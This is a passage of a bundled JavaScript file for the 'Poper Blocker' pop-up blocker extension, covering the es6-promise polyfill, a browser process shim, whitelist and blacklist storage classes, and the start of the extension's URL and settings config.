
	  Enumerator.prototype._eachEntry = function _eachEntry(entry, i) {
	    var c = this._instanceConstructor;
	    var resolve$$1 = c.resolve;


	    if (resolve$$1 === resolve$1) {
	      var _then = getThen(entry);

	      if (_then === then && entry._state !== PENDING) {
	        this._settledAt(entry._state, i, entry._result);
	      } else if (typeof _then !== 'function') {
	        this._remaining--;
	        this._result[i] = entry;
	      } else if (c === Promise$1) {
	        var promise = new c(noop);
	        handleMaybeThenable(promise, entry, _then);
	        this._willSettleAt(promise, i);
	      } else {
	        this._willSettleAt(new c(function (resolve$$1) {
	          return resolve$$1(entry);
	        }), i);
	      }
	    } else {
	      this._willSettleAt(resolve$$1(entry), i);
	    }
	  };

	  Enumerator.prototype._settledAt = function _settledAt(state, i, value) {
	    var promise = this.promise;


	    if (promise._state === PENDING) {
	      this._remaining--;

	      if (state === REJECTED) {
	        reject(promise, value);
	      } else {
	        this._result[i] = value;
	      }
	    }

	    if (this._remaining === 0) {
	      fulfill(promise, this._result);
	    }
	  };

	  Enumerator.prototype._willSettleAt = function _willSettleAt(promise, i) {
	    var enumerator = this;

	    subscribe(promise, undefined, function (value) {
	      return enumerator._settledAt(FULFILLED, i, value);
	    }, function (reason) {
	      return enumerator._settledAt(REJECTED, i, reason);
	    });
	  };

	  return Enumerator;
	}();

	/**
	  `Promise.all` accepts an array of promises, and returns a new promise which
	  is fulfilled with an array of fulfillment values for the passed promises, or
	  rejected with the reason of the first passed promise to be rejected. It casts all
	  elements of the passed iterable to promises as it runs this algorithm.

	  Example:

	  ```javascript
	  let promise1 = resolve(1);
	  let promise2 = resolve(2);
	  let promise3 = resolve(3);
	  let promises = [ promise1, promise2, promise3 ];

	  Promise.all(promises).then(function(array){
	    // The array here would be [ 1, 2, 3 ];
	  });
	  ```

	  If any of the `promises` given to `all` are rejected, the first promise
	  that is rejected will be given as an argument to the returned promises's
	  rejection handler. For example:

	  Example:

	  ```javascript
	  let promise1 = resolve(1);
	  let promise2 = reject(new Error("2"));
	  let promise3 = reject(new Error("3"));
	  let promises = [ promise1, promise2, promise3 ];

	  Promise.all(promises).then(function(array){
	    // Code here never runs because there are rejected promises!
	  }, function(error) {
	    // error.message === "2"
	  });
	  ```

	  @method all
	  @static
	  @param {Array} entries array of promises
	  @param {String} label optional string for labeling the promise.
	  Useful for tooling.
	  @return {Promise} promise that is fulfilled when all `promises` have been
	  fulfilled, or rejected if any of them become rejected.
	  @static
	*/
	function all(entries) {
	  return new Enumerator(this, entries).promise;
	}

	/**
	  `Promise.race` returns a new promise which is settled in the same way as the
	  first passed promise to settle.

	  Example:

	  ```javascript
	  let promise1 = new Promise(function(resolve, reject){
	    setTimeout(function(){
	      resolve('promise 1');
	    }, 200);
	  });

	  let promise2 = new Promise(function(resolve, reject){
	    setTimeout(function(){
	      resolve('promise 2');
	    }, 100);
	  });

	  Promise.race([promise1, promise2]).then(function(result){
	    // result === 'promise 2' because it was resolved before promise1
	    // was resolved.
	  });
	  ```

	  `Promise.race` is deterministic in that only the state of the first
	  settled promise matters. For example, even if other promises given to the
	  `promises` array argument are resolved, but the first settled promise has
	  become rejected before the other promises became fulfilled, the returned
	  promise will become rejected:

	  ```javascript
	  let promise1 = new Promise(function(resolve, reject){
	    setTimeout(function(){
	      resolve('promise 1');
	    }, 200);
	  });

	  let promise2 = new Promise(function(resolve, reject){
	    setTimeout(function(){
	      reject(new Error('promise 2'));
	    }, 100);
	  });

	  Promise.race([promise1, promise2]).then(function(result){
	    // Code here never runs
	  }, function(reason){
	    // reason.message === 'promise 2' because promise 2 became rejected before
	    // promise 1 became fulfilled
	  });
	  ```

	  An example real-world use case is implementing timeouts:

	  ```javascript
	  Promise.race([ajax('foo.json'), timeout(5000)])
	  ```

	  @method race
	  @static
	  @param {Array} promises array of promises to observe
	  Useful for tooling.
	  @return {Promise} a promise which settles in the same way as the first passed
	  promise to settle.
	*/
	function race(entries) {
	  /*jshint validthis:true */
	  var Constructor = this;

	  if (!isArray(entries)) {
	    return new Constructor(function (_, reject) {
	      return reject(new TypeError('You must pass an array to race.'));
	    });
	  } else {
	    return new Constructor(function (resolve, reject) {
	      var length = entries.length;
	      for (var i = 0; i < length; i++) {
	        Constructor.resolve(entries[i]).then(resolve, reject);
	      }
	    });
	  }
	}

	/**
	  `Promise.reject` returns a promise rejected with the passed `reason`.
	  It is shorthand for the following:

	  ```javascript
	  let promise = new Promise(function(resolve, reject){
	    reject(new Error('WHOOPS'));
	  });

	  promise.then(function(value){
	    // Code here doesn't run because the promise is rejected!
	  }, function(reason){
	    // reason.message === 'WHOOPS'
	  });
	  ```

	  Instead of writing the above, your code now simply becomes the following:

	  ```javascript
	  let promise = Promise.reject(new Error('WHOOPS'));

	  promise.then(function(value){
	    // Code here doesn't run because the promise is rejected!
	  }, function(reason){
	    // reason.message === 'WHOOPS'
	  });
	  ```

	  @method reject
	  @static
	  @param {Any} reason value that the returned promise will be rejected with.
	  Useful for tooling.
	  @return {Promise} a promise rejected with the given `reason`.
	*/
	function reject$1(reason) {
	  /*jshint validthis:true */
	  var Constructor = this;
	  var promise = new Constructor(noop);
	  reject(promise, reason);
	  return promise;
	}

	function needsResolver() {
	  throw new TypeError('You must pass a resolver function as the first argument to the promise constructor');
	}

	function needsNew() {
	  throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");
	}

	/**
	  Promise objects represent the eventual result of an asynchronous operation. The
	  primary way of interacting with a promise is through its `then` method, which
	  registers callbacks to receive either a promise's eventual value or the reason
	  why the promise cannot be fulfilled.

	  Terminology
	  -----------

	  - `promise` is an object or function with a `then` method whose behavior conforms to this specification.
	  - `thenable` is an object or function that defines a `then` method.
	  - `value` is any legal JavaScript value (including undefined, a thenable, or a promise).
	  - `exception` is a value that is thrown using the throw statement.
	  - `reason` is a value that indicates why a promise was rejected.
	  - `settled` the final resting state of a promise, fulfilled or rejected.

	  A promise can be in one of three states: pending, fulfilled, or rejected.

	  Promises that are fulfilled have a fulfillment value and are in the fulfilled
	  state.  Promises that are rejected have a rejection reason and are in the
	  rejected state.  A fulfillment value is never a thenable.

	  Promises can also be said to *resolve* a value.  If this value is also a
	  promise, then the original promise's settled state will match the value's
	  settled state.  So a promise that *resolves* a promise that rejects will
	  itself reject, and a promise that *resolves* a promise that fulfills will
	  itself fulfill.


	  Basic Usage:
	  ------------

	  ```js
	  let promise = new Promise(function(resolve, reject) {
	    // on success
	    resolve(value);

	    // on failure
	    reject(reason);
	  });

	  promise.then(function(value) {
	    // on fulfillment
	  }, function(reason) {
	    // on rejection
	  });
	  ```

	  Advanced Usage:
	  ---------------

	  Promises shine when abstracting away asynchronous interactions such as
	  `XMLHttpRequest`s.

	  ```js
	  function getJSON(url) {
	    return new Promise(function(resolve, reject){
	      let xhr = new XMLHttpRequest();

	      xhr.open('GET', url);
	      xhr.onreadystatechange = handler;
	      xhr.responseType = 'json';
	      xhr.setRequestHeader('Accept', 'application/json');
	      xhr.send();

	      function handler() {
	        if (this.readyState === this.DONE) {
	          if (this.status === 200) {
	            resolve(this.response);
	          } else {
	            reject(new Error('getJSON: `' + url + '` failed with status: [' + this.status + ']'));
	          }
	        }
	      };
	    });
	  }

	  getJSON('/posts.json').then(function(json) {
	    // on fulfillment
	  }, function(reason) {
	    // on rejection
	  });
	  ```

	  Unlike callbacks, promises are great composable primitives.

	  ```js
	  Promise.all([
	    getJSON('/posts'),
	    getJSON('/comments')
	  ]).then(function(values){
	    values[0] // => postsJSON
	    values[1] // => commentsJSON

	    return values;
	  });
	  ```

	  @class Promise
	  @param {Function} resolver
	  Useful for tooling.
	  @constructor
	*/

	var Promise$1 = function () {
	  function Promise(resolver) {
	    this[PROMISE_ID] = nextId();
	    this._result = this._state = undefined;
	    this._subscribers = [];

	    if (noop !== resolver) {
	      typeof resolver !== 'function' && needsResolver();
	      this instanceof Promise ? initializePromise(this, resolver) : needsNew();
	    }
	  }

	  /**
	  The primary way of interacting with a promise is through its `then` method,
	  which registers callbacks to receive either a promise's eventual value or the
	  reason why the promise cannot be fulfilled.
	   ```js
	  findUser().then(function(user){
	    // user is available
	  }, function(reason){
	    // user is unavailable, and you are given the reason why
	  });
	  ```
	   Chaining
	  --------
	   The return value of `then` is itself a promise.  This second, 'downstream'
	  promise is resolved with the return value of the first promise's fulfillment
	  or rejection handler, or rejected if the handler throws an exception.
	   ```js
	  findUser().then(function (user) {
	    return user.name;
	  }, function (reason) {
	    return 'default name';
	  }).then(function (userName) {
	    // If `findUser` fulfilled, `userName` will be the user's name, otherwise it
	    // will be `'default name'`
	  });
	   findUser().then(function (user) {
	    throw new Error('Found user, but still unhappy');
	  }, function (reason) {
	    throw new Error('`findUser` rejected and we're unhappy');
	  }).then(function (value) {
	    // never reached
	  }, function (reason) {
	    // if `findUser` fulfilled, `reason` will be 'Found user, but still unhappy'.
	    // If `findUser` rejected, `reason` will be '`findUser` rejected and we're unhappy'.
	  });
	  ```
	  If the downstream promise does not specify a rejection handler, rejection reasons will be propagated further downstream.
	   ```js
	  findUser().then(function (user) {
	    throw new PedagogicalException('Upstream error');
	  }).then(function (value) {
	    // never reached
	  }).then(function (value) {
	    // never reached
	  }, function (reason) {
	    // The `PedgagocialException` is propagated all the way down to here
	  });
	  ```
	   Assimilation
	  ------------
	   Sometimes the value you want to propagate to a downstream promise can only be
	  retrieved asynchronously. This can be achieved by returning a promise in the
	  fulfillment or rejection handler. The downstream promise will then be pending
	  until the returned promise is settled. This is called *assimilation*.
	   ```js
	  findUser().then(function (user) {
	    return findCommentsByAuthor(user);
	  }).then(function (comments) {
	    // The user's comments are now available
	  });
	  ```
	   If the assimliated promise rejects, then the downstream promise will also reject.
	   ```js
	  findUser().then(function (user) {
	    return findCommentsByAuthor(user);
	  }).then(function (comments) {
	    // If `findCommentsByAuthor` fulfills, we'll have the value here
	  }, function (reason) {
	    // If `findCommentsByAuthor` rejects, we'll have the reason here
	  });
	  ```
	   Simple Example
	  --------------
	   Synchronous Example
	   ```javascript
	  let result;
	   try {
	    result = findResult();
	    // success
	  } catch(reason) {
	    // failure
	  }
	  ```
	   Errback Example
	   ```js
	  findResult(function(result, err){
	    if (err) {
	      // failure
	    } else {
	      // success
	    }
	  });
	  ```
	   Promise Example;
	   ```javascript
	  findResult().then(function(result){
	    // success
	  }, function(reason){
	    // failure
	  });
	  ```
	   Advanced Example
	  --------------
	   Synchronous Example
	   ```javascript
	  let author, books;
	   try {
	    author = findAuthor();
	    books  = findBooksByAuthor(author);
	    // success
	  } catch(reason) {
	    // failure
	  }
	  ```
	   Errback Example
	   ```js
	   function foundBooks(books) {
	   }
	   function failure(reason) {
	   }
	   findAuthor(function(author, err){
	    if (err) {
	      failure(err);
	      // failure
	    } else {
	      try {
	        findBoooksByAuthor(author, function(books, err) {
	          if (err) {
	            failure(err);
	          } else {
	            try {
	              foundBooks(books);
	            } catch(reason) {
	              failure(reason);
	            }
	          }
	        });
	      } catch(error) {
	        failure(err);
	      }
	      // success
	    }
	  });
	  ```
	   Promise Example;
	   ```javascript
	  findAuthor().
	    then(findBooksByAuthor).
	    then(function(books){
	      // found books
	  }).catch(function(reason){
	    // something went wrong
	  });
	  ```
	   @method then
	  @param {Function} onFulfilled
	  @param {Function} onRejected
	  Useful for tooling.
	  @return {Promise}
	  */

	  /**
	  `catch` is simply sugar for `then(undefined, onRejection)` which makes it the same
	  as the catch block of a try/catch statement.
	  ```js
	  function findAuthor(){
	  throw new Error('couldn't find that author');
	  }
	  // synchronous
	  try {
	  findAuthor();
	  } catch(reason) {
	  // something went wrong
	  }
	  // async with promises
	  findAuthor().catch(function(reason){
	  // something went wrong
	  });
	  ```
	  @method catch
	  @param {Function} onRejection
	  Useful for tooling.
	  @return {Promise}
	  */


	  Promise.prototype.catch = function _catch(onRejection) {
	    return this.then(null, onRejection);
	  };

	  /**
	    `finally` will be invoked regardless of the promise's fate just as native
	    try/catch/finally behaves
	  
	    Synchronous example:
	  
	    ```js
	    findAuthor() {
	      if (Math.random() > 0.5) {
	        throw new Error();
	      }
	      return new Author();
	    }
	  
	    try {
	      return findAuthor(); // succeed or fail
	    } catch(error) {
	      return findOtherAuther();
	    } finally {
	      // always runs
	      // doesn't affect the return value
	    }
	    ```
	  
	    Asynchronous example:
	  
	    ```js
	    findAuthor().catch(function(reason){
	      return findOtherAuther();
	    }).finally(function(){
	      // author was either found, or not
	    });
	    ```
	  
	    @method finally
	    @param {Function} callback
	    @return {Promise}
	  */


	  Promise.prototype.finally = function _finally(callback) {
	    var promise = this;
	    var constructor = promise.constructor;

	    return promise.then(function (value) {
	      return constructor.resolve(callback()).then(function () {
	        return value;
	      });
	    }, function (reason) {
	      return constructor.resolve(callback()).then(function () {
	        throw reason;
	      });
	    });
	  };

	  return Promise;
	}();

	Promise$1.prototype.then = then;
	Promise$1.all = all;
	Promise$1.race = race;
	Promise$1.resolve = resolve$1;
	Promise$1.reject = reject$1;
	Promise$1._setScheduler = setScheduler;
	Promise$1._setAsap = setAsap;
	Promise$1._asap = asap;

	/*global self*/
	function polyfill() {
	  var local = void 0;

	  if (typeof global !== 'undefined') {
	    local = global;
	  } else if (typeof self !== 'undefined') {
	    local = self;
	  } else {
	    try {
	      local = Function('return this')();
	    } catch (e) {
	      throw new Error('polyfill failed because global object is unavailable in this environment');
	    }
	  }

	  var P = local.Promise;

	  if (P) {
	    var promiseToString = null;
	    try {
	      promiseToString = Object.prototype.toString.call(P.resolve());
	    } catch (e) {
	      // silently ignored
	    }

	    if (promiseToString === '[object Promise]' && !P.cast) {
	      return;
	    }
	  }

	  local.Promise = Promise$1;
	}

	// Strange compat..
	Promise$1.polyfill = polyfill;
	Promise$1.Promise = Promise$1;

	return Promise$1;

	})));



	//# sourceMappingURL=es6-promise.map

	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(6), (function() { return this; }())))

/***/ }),
/* 6 */
/***/ (function(module, exports) {

	// shim for using process in browser
	var process = module.exports = {};

	// cached from whatever global is present so that test runners that stub it
	// don't break things.  But we need to wrap it in a try catch in case it is
	// wrapped in strict mode code which doesn't define any globals.  It's inside a
	// function because try/catches deoptimize in certain engines.

	var cachedSetTimeout;
	var cachedClearTimeout;

	function defaultSetTimout() {
	    throw new Error('setTimeout has not been defined');
	}
	function defaultClearTimeout () {
	    throw new Error('clearTimeout has not been defined');
	}
	(function () {
	    try {
	        if (typeof setTimeout === 'function') {
	            cachedSetTimeout = setTimeout;
	        } else {
	            cachedSetTimeout = defaultSetTimout;
	        }
	    } catch (e) {
	        cachedSetTimeout = defaultSetTimout;
	    }
	    try {
	        if (typeof clearTimeout === 'function') {
	            cachedClearTimeout = clearTimeout;
	        } else {
	            cachedClearTimeout = defaultClearTimeout;
	        }
	    } catch (e) {
	        cachedClearTimeout = defaultClearTimeout;
	    }
	} ())
	function runTimeout(fun) {
	    if (cachedSetTimeout === setTimeout) {
	        //normal enviroments in sane situations
	        return setTimeout(fun, 0);
	    }
	    // if setTimeout wasn't available but was latter defined
	    if ((cachedSetTimeout === defaultSetTimout || !cachedSetTimeout) && setTimeout) {
	        cachedSetTimeout = setTimeout;
	        return setTimeout(fun, 0);
	    }
	    try {
	        // when when somebody has screwed with setTimeout but no I.E. maddness
	        return cachedSetTimeout(fun, 0);
	    } catch(e){
	        try {
	            // When we are in I.E. but the script has been evaled so I.E. doesn't trust the global object when called normally
	            return cachedSetTimeout.call(null, fun, 0);
	        } catch(e){
	            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error
	            return cachedSetTimeout.call(this, fun, 0);
	        }
	    }


	}
	function runClearTimeout(marker) {
	    if (cachedClearTimeout === clearTimeout) {
	        //normal enviroments in sane situations
	        return clearTimeout(marker);
	    }
	    // if clearTimeout wasn't available but was latter defined
	    if ((cachedClearTimeout === defaultClearTimeout || !cachedClearTimeout) && clearTimeout) {
	        cachedClearTimeout = clearTimeout;
	        return clearTimeout(marker);
	    }
	    try {
	        // when when somebody has screwed with setTimeout but no I.E. maddness
	        return cachedClearTimeout(marker);
	    } catch (e){
	        try {
	            // When we are in I.E. but the script has been evaled so I.E. doesn't  trust the global object when called normally
	            return cachedClearTimeout.call(null, marker);
	        } catch (e){
	            // same as above but when it's a version of I.E. that must have the global object for 'this', hopfully our context correct otherwise it will throw a global error.
	            // Some versions of I.E. have different rules for clearTimeout vs setTimeout
	            return cachedClearTimeout.call(this, marker);
	        }
	    }



	}
	var queue = [];
	var draining = false;
	var currentQueue;
	var queueIndex = -1;

	function cleanUpNextTick() {
	    if (!draining || !currentQueue) {
	        return;
	    }
	    draining = false;
	    if (currentQueue.length) {
	        queue = currentQueue.concat(queue);
	    } else {
	        queueIndex = -1;
	    }
	    if (queue.length) {
	        drainQueue();
	    }
	}

	function drainQueue() {
	    if (draining) {
	        return;
	    }
	    var timeout = runTimeout(cleanUpNextTick);
	    draining = true;

	    var len = queue.length;
	    while(len) {
	        currentQueue = queue;
	        queue = [];
	        while (++queueIndex < len) {
	            if (currentQueue) {
	                currentQueue[queueIndex].run();
	            }
	        }
	        queueIndex = -1;
	        len = queue.length;
	    }
	    currentQueue = null;
	    draining = false;
	    runClearTimeout(timeout);
	}

	process.nextTick = function (fun) {
	    var args = new Array(arguments.length - 1);
	    if (arguments.length > 1) {
	        for (var i = 1; i < arguments.length; i++) {
	            args[i - 1] = arguments[i];
	        }
	    }
	    queue.push(new Item(fun, args));
	    if (queue.length === 1 && !draining) {
	        runTimeout(drainQueue);
	    }
	};

	// v8 likes predictible objects
	function Item(fun, array) {
	    this.fun = fun;
	    this.array = array;
	}
	Item.prototype.run = function () {
	    this.fun.apply(null, this.array);
	};
	process.title = 'browser';
	process.browser = true;
	process.env = {};
	process.argv = [];
	process.version = ''; // empty string to avoid regexp issues
	process.versions = {};

	function noop() {}

	process.on = noop;
	process.addListener = noop;
	process.once = noop;
	process.off = noop;
	process.removeListener = noop;
	process.removeAllListeners = noop;
	process.emit = noop;
	process.prependListener = noop;
	process.prependOnceListener = noop;

	process.listeners = function (name) { return [] }

	process.binding = function (name) {
	    throw new Error('process.binding is not supported');
	};

	process.cwd = function () { return '/' };
	process.chdir = function (dir) {
	    throw new Error('process.chdir is not supported');
	};
	process.umask = function() { return 0; };


/***/ }),
/* 7 */
/***/ (function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _PBCombinedStorage2 = __webpack_require__(8);

	var _PBCombinedStorage3 = _interopRequireDefault(_PBCombinedStorage2);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

	function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

	/**
	 * Combined storage which merges all results to one array
	 * {whitelist: ['a', 'b'], blacklist: ['b', 'c']}
	 * -> ['a', 'b', 'b', 'c']
	 * @constructor
	 */
	var PBCombinedMergedStorage = function (_PBCombinedStorage) {
	  _inherits(PBCombinedMergedStorage, _PBCombinedStorage);

	  function PBCombinedMergedStorage() {
	    _classCallCheck(this, PBCombinedMergedStorage);

	    var _this = _possibleConstructorReturn(this, (PBCombinedMergedStorage.__proto__ || Object.getPrototypeOf(PBCombinedMergedStorage)).call(this));

	    _this.setStorages(arguments);
	    _this.combine = _PBCombinedStorage3.default.COMBINE_MERGE;
	    return _this;
	  }

	  return PBCombinedMergedStorage;
	}(_PBCombinedStorage3.default);

	;

	exports.default = PBCombinedMergedStorage;

/***/ }),
/* 8 */
/***/ (function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	var _PBStorageInstance = __webpack_require__(4);

	var _PBStorageInstance2 = _interopRequireDefault(_PBStorageInstance);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	var _Promise = typeof Promise === 'undefined' ? __webpack_require__(5).Promise : Promise; /**
	                                                                                           * Created by sekot on 2016-10-27.
	                                                                                           */


	/**
	 * Class for multiple storages to be treated a one
	 * Treat this as a composite pattern
	 * @constructor
	 */
	var PBCombinedStorage = function () {
	  _createClass(PBCombinedStorage, null, [{
	    key: 'COMBINE_MAP',

	    /**
	     * Combines all results of all storages to a map name -> value
	     * @param Map values {storage name : storage value}
	     * @param Array storages array of storages
	     * @returns {{}} Map with KEY as a name of storage and value as a value stored there
	     * @constructor
	     */
	    value: function COMBINE_MAP(values, storages) {
	      var responses = {};
	      values.forEach(function (val, idx) {
	        responses[storages[idx].key] = val;
	      });
	      return responses;
	    }

	    /**
	     * Combines all results of all storages to a single dimention domain
	     * @param Map values {storage name : storage value}
	     * @param Array storages array of storages
	     * @returns {Array} array of all values of all storages merged to single dimention array
	     * @constructor
	     */

	  }, {
	    key: 'COMBINE_MERGE',
	    value: function COMBINE_MERGE(values, storages) {
	      var responses = [];
	      values.forEach(function (val) {
	        if (val instanceof Array) {
	          responses = responses.concat(val);
	        } else {
	          responses.push(val);
	        }
	      });
	      return responses;
	    }
	  }]);

	  function PBCombinedStorage() {
	    _classCallCheck(this, PBCombinedStorage);

	    this.storages = [];
	    this.setStorages(arguments);
	  }

	  _createClass(PBCombinedStorage, [{
	    key: 'getStoragesMapped',
	    value: function getStoragesMapped() {
	      var obj = {};

	      var _iteratorNormalCompletion = true;
	      var _didIteratorError = false;
	      var _iteratorError = undefined;

	      try {
	        for (var _iterator = this.storages[Symbol.iterator](), _step; !(_iteratorNormalCompletion = (_step = _iterator.next()).done); _iteratorNormalCompletion = true) {
	          var current = _step.value;

	          obj[current.key] = current;
	        }
	      } catch (err) {
	        _didIteratorError = true;
	        _iteratorError = err;
	      } finally {
	        try {
	          if (!_iteratorNormalCompletion && _iterator.return) {
	            _iterator.return();
	          }
	        } finally {
	          if (_didIteratorError) {
	            throw _iteratorError;
	          }
	        }
	      }

	      return obj;
	    }

	    /**
	     * Sets the array of storages used to combine result
	     * @param storageArray
	     */

	  }, {
	    key: 'setStorages',
	    value: function setStorages(storageArray) {
	      for (var i = 0; i < storageArray.length; i++) {
	        var currentArgument = storageArray[i];
	        if (currentArgument instanceof _PBStorageInstance2.default || currentArgument instanceof PBCombinedStorage) {
	          this.storages.push(currentArgument);
	        } else {
	          throw new Error('Illegal invocation. PBStorageInstance expected at [' + i + '].');
	        }
	      }
	    }

	    /**
	     *
	     * @param Map values {storage name : storage value}
	     * @param Array storages array of storages
	     */

	  }, {
	    key: 'combine',
	    value: function combine(values, storages) {}

	    /**
	     * Gets all from all storages and combines the result
	     * @returns {Promise}
	     */

	  }, {
	    key: 'get',
	    value: function get() {
	      var self = this;
	      var storages = this.storages;
	      var promises = [];
	      for (var i = 0; i < storages.length; i++) {
	        promises.push(storages[i].get());
	      }

	      return new _Promise(function (resolve) {
	        _Promise.all(promises).then(function (values) {
	          resolve(self.combine(values, storages));
	        });
	      });
	    }
	  }]);

	  return PBCombinedStorage;
	}();

	exports.default = PBCombinedStorage;

/***/ }),
/* 9 */
/***/ (function(module, exports, __webpack_require__) {

	'use strict';

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});

	var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

	var _PBCombinedStorage2 = __webpack_require__(8);

	var _PBCombinedStorage3 = _interopRequireDefault(_PBCombinedStorage2);

	function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

	function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

	function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

	function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

	var _Promise = typeof Promise === 'undefined' ? __webpack_require__(5).Promise : Promise; /**
	                                                                                           * Created by sekot on 2016-10-27.
	                                                                                           */

	/**
	 * Combined storage which merges all results to map
	 * {whitelist: ['a', 'b'], blacklist: ['b', 'c']}
	 * -> {whitelist: ['a', 'b'], blacklist: ['b', 'c']}
	 * @constructor
	 */
	var PBCombinedMappedStorage = function (_PBCombinedStorage) {
	  _inherits(PBCombinedMappedStorage, _PBCombinedStorage);

	  function PBCombinedMappedStorage() {
	    _classCallCheck(this, PBCombinedMappedStorage);

	    var _this = _possibleConstructorReturn(this, (PBCombinedMappedStorage.__proto__ || Object.getPrototypeOf(PBCombinedMappedStorage)).call(this));

	    _this.setStorages(arguments);
	    _this.combine = _PBCombinedStorage3.default.COMBINE_MAP;
	    _this.storages = [];
	    _this.parentStorage = null;
	    return _this;
	  }

	  _createClass(PBCombinedMappedStorage, [{
	    key: 'setParentStorage',
	    value: function setParentStorage(parentStorage) {
	      this.parentStorage = parentStorage;
	      return this;
	    }
	  }, {
	    key: 'set',
	    value: function set(values) {
	      // values = {pb_name:value}
	      var self = this;
	      return new _Promise(function (resolve) {
	        self.parentStorage.set(values, resolve);
	      });
	    }
	  }, {
	    key: 'update',
	    value: function update(updateFunction) {
	      var self = this;
	      return new _Promise(function (resolve) {
	        self.get().then(function (mappedValues) {
	          mappedValues = updateFunction(mappedValues);
	          self.set(mappedValues).then(resolve);
	        });
	      });
	    }
	  }]);

	  return PBCombinedMappedStorage;
	}(_PBCombinedStorage3.default);

	exports.default = PBCombinedMappedStorage;

/***/ }),
/* 10 */
/***/ (function(module, exports) {

	"use strict";

	Object.defineProperty(exports, "__esModule", {
	  value: true
	});
	var Config = {
	  "thank_you_page_CH": "https://poperblocker.com/welcome",
	  "thank_you_page_FF": "https://poperblocker.com/welcome-firefox",
	  "uninstall_page_CH": "https://poperblocker.com/uninstall/?",
	  "uninstall_page_FF": "https://poperblocker.com/uninstall-firefox/?",
	  "feedback_page": "https://poperblocker.com/feedback.html?from=ext",
	  "contact_page": "https://poperblocker.com/contact-form.html",
	  "appStore_CH": "https://chrome.google.com/webstore/detail/pop-up-blocker-for-chrome/bkkbcggnhapdmkeljlodobbkopceiche",
	  "appStore_FF": "https://addons.mozilla.org/en-US/firefox/addon/poper-blocker-pop-up-blocker/",
	  "extension_review_page_CH": "https://chrome.google.com/webstore/detail/pop-up-blocker-for-chrome/bkkbcggnhapdmkeljlodobbkopceiche/reviews",
	  "extension_review_page_FF": "https://addons.mozilla.org/en-US/firefox/addon/poper-blocker-pop-up-blocker/reviews/add",
	  "twitter_share_link": "https://twitter.com/intent/tweet?hashtags=popups&original_referer=https%3A%2F%2Fpoperblocker.com%3Fref%3Dfb_pp_share&related=socialmediahats&text=I'm%20using%20poper%20blocker%20to%20enjoy%20a%20popup%20free%20browsing%20experience%20pic.twitter.com%2FniqVgqfmAw&url=https%3A%2F%2Fgoo.gl%2FryoaEn&via=poper_blocker",
	  "facebook_share_link": "https://www.facebook.com/dialog/share?app_id=1911035589168170&display=popup&href=https%3A%2F%2Fpoperblocker.com%3Fref%3Dfb_pp_share%3Fhl%3Den&hashtag=%23For_No_More_Popups_Click_Below",
	  "overlay_check_API": "https://api2.poperblocker.com/view/update",
	  "overlay_blocking_context_item_contexts": ["page", "frame", "selection", "link", "editable", "image", "video", "audio"],
	  "googleSheetID": "1dRQsmt6DYMXGo3YeTQ442kV-xxG1LJfG41wEUpnWefM",
	  "dataSettings": {
	    strKeys: ["ga_allEvent_rate", "ni"],
	    arrKeys: ["blacklist", "whitelist"]
	  },
	  "blockCountsToShowRate": 5,
	  "blockCountsToShowRateAgain": 100, //user did not rate at the first time, then show the rate bar every THIS count
	  "defaultWhiteList": ["disqus.com", "engage.wixapps.net", "linkedin.com", "google", "www.gmail.com", "www.pinterest.com", "www.youtube.com", "www.facebook.com", "search.yahoo.com", "chrome://newtab", "www.food.com"],
